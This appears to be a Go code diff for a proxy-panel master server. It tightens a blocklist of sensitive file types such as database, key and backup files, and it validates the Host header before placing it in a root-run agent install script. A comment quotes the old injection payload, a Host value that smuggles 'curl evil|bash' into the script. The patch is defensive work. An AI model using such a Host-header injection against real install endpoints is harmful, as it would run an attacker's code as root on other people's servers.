@@ -3,10 +3,12 @@ package master
 import (
 	_ "embed"
 	"fmt"
+	"net"
 	"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 
 	"work-v/internal/master/api"
@@ -70,9 +72,25 @@ func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
 			}
 		}
 
-		// 明确拒绝数据库、配置文件、源代码与隐藏文件
-		if !isAllowed || strings.HasSuffix(filename, ".db") || strings.HasSuffix(filename, ".env") ||
-			strings.HasSuffix(filename, ".go") || strings.HasSuffix(filename, ".yml") || strings.HasPrefix(filename, ".") {
+		// 拒绝数据库、配置、源码、证书与隐藏文件。
+		// 注意必须用"包含"而不是"后缀": 历史实现只判断后缀, 于是 work-v.db.bak /
+		// config.yml.bak 这类备份文件会把数据库(含管理员哈希与节点 Token)匿名泄露出去。
+		blockedSubstrings := []string{".db", ".env", ".go", ".yml", ".yaml", ".json", ".conf", ".pem", ".key", ".log", ".bak", ".."}
+		blocked := strings.HasPrefix(filename, ".")
+		for _, s := range blockedSubstrings {
+			if strings.Contains(filename, s) {
+				blocked = true
+				break
+			}
+		}
+		for _, ch := range filename {
+			isSafe := (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '.' || ch == '-' || ch == '_'
+			if !isSafe {
+				blocked = true
+				break
+			}
+		}
+		if !isAllowed || blocked {
 			c.String(http.StatusForbidden, "Access denied")
 			return
 		}
@@ -162,6 +180,10 @@ func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
 			admin.GET("/nodes/:id/logs", api.HandleGetNodeLogs)
 			admin.POST("/nodes/:id/ping", api.HandlePingNode)
 
+			// 一键自动部署 (SSH 纳管) 与进度查询
+			admin.POST("/auto-deploy", api.HandleAutoDeployNode)
+			admin.GET("/auto-deploy/:id", api.HandleGetAutoDeployStatus)
+
 			// sing-box 内核管理与在线升级 (借鉴 iwantrun 最佳实践)
 			admin.GET("/singbox/version", api.HandleGetSingboxVersion)
 			admin.POST("/singbox/upgrade", api.HandleUpgradeSingbox)
@@ -186,6 +208,9 @@ func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
 
 	// 5. 前端静态文件托管 (SPA 支持)
 	if webDistFS != nil {
+		// 登记根目录下的静态资源, 只有这些文件允许在未通过安全入口时访问
+		middleware.SetAllowedStaticAssets(scanStaticAssets(webDistFS))
+
 		fileServer := http.FileServer(webDistFS)
 		r.NoRoute(func(c *gin.Context) {
 			path := c.Request.URL.Path
@@ -201,6 +226,12 @@ func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
 				fileServer.ServeHTTP(c.Writer, c.Request)
 				return
 			}
+			// 看起来像静态资源却不存在的路径直接 404, 不再回落 index.html。
+			// 否则未通过安全入口的 /x.js 也能把面板 HTML 取走 (见 SafeEntranceFilter)。
+			if path != "/" && filepath.Ext(path) != "" {
+				c.String(http.StatusNotFound, "404 page not found")
+				return
+			}
 			c.Request.URL.Path = "/"
 			fileServer.ServeHTTP(c.Writer, c.Request)
 		})
@@ -209,13 +240,43 @@ func SetupRouter(webDistFS http.FileSystem) *gin.Engine {
 	return r
 }
 
+// scanStaticAssets 列出前端产物根目录下的静态资源 (index.html 不在免检之列)。
+// 安全入口依赖这份白名单, 只有真实存在的资源才允许绕过入口拦截。
+func scanStaticAssets(webDistFS http.FileSystem) []string {
+	f, err := webDistFS.Open("/")
+	if err != nil {
+		return nil
+	}
+	defer f.Close()
+
+	entries, err := f.Readdir(-1)
+	if err != nil {
+		return nil
+	}
+	names := make([]string, 0, len(entries))
+	for _, e := range entries {
+		if e.IsDir() || e.Name() == "index.html" {
+			continue
+		}
+		names = append(names, "/"+e.Name())
+	}
+	return names
+}
+
 // handleAgentInstallScript 动态生成并返回主副节点智能自适应安装脚本
 func handleAgentInstallScript(c *gin.Context) {
 	scheme := "http"
 	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
 		scheme = "https"
 	}
-	host := c.Request.Host
+	// Host 头完全由客户端控制, 必须严格校验后才能拼进"即将以 root 执行"的安装脚本。
+	// 历史实现直接 sprintf 且使用 ReplaceAllString (会把 $1 当捕获组解析),
+	// 构造 Host: a.com";curl evil|bash;# 即可把任意命令注入脚本。
+	host, ok := sanitizeHost(c.Request.Host)
+	if !ok {
+		c.String(http.StatusBadRequest, "Invalid Host header")
+		return
+	}
 	masterURL := fmt.Sprintf("%s://%s", scheme, host)
 
 	// 优先使用配置的外网主控域名
@@ -244,10 +305,47 @@ func handleAgentInstallScript(c *gin.Context) {
 
 	// 动态注入主控端地址
 	re := regexp.MustCompile(`DEFAULT_SERVER="[^"]*"`)
-	script = re.ReplaceAllString(script, fmt.Sprintf(`DEFAULT_SERVER="%s"`, masterURL))
+	// 必须使用 Literal 版本: ReplaceAllString 会把替换串里的 $1/${name} 当作捕获组展开
+	script = re.ReplaceAllLiteralString(script, fmt.Sprintf(`DEFAULT_SERVER="%s"`, masterURL))
 
 	c.Header("Content-Type", "text/plain; charset=utf-8")
 	c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
 	c.String(http.StatusOK, script)
 }
 
+// sanitizeHost 校验并规范化 Host 头 (host[:port])。
+// 只接受合法域名或 IP 与数字端口, 引号/分号/$/空白/斜杠等一律拒绝。
+func sanitizeHost(raw string) (string, bool) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" || len(raw) > 255 {
+		return "", false
+	}
+
+	host, port := raw, ""
+	if h, p, err := net.SplitHostPort(raw); err == nil {
+		host, port = h, p
+	}
+	host = strings.Trim(host, "[]") // IPv6
+	if host == "" {
+		return "", false
+	}
+
+	if net.ParseIP(host) == nil {
+		for _, ch := range host {
+			isAlnum := (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')
+			if isAlnum || ch == '.' || ch == '-' || ch == '_' {
+				continue
+			}
+			return "", false
+		}
+	}
+
+	if port != "" {
+		n, err := strconv.Atoi(port)
+		if err != nil || n < 1 || n > 65535 {
+			return "", false
+		}
+		return net.JoinHostPort(host, port), true
+	}
+	return host, true
+}
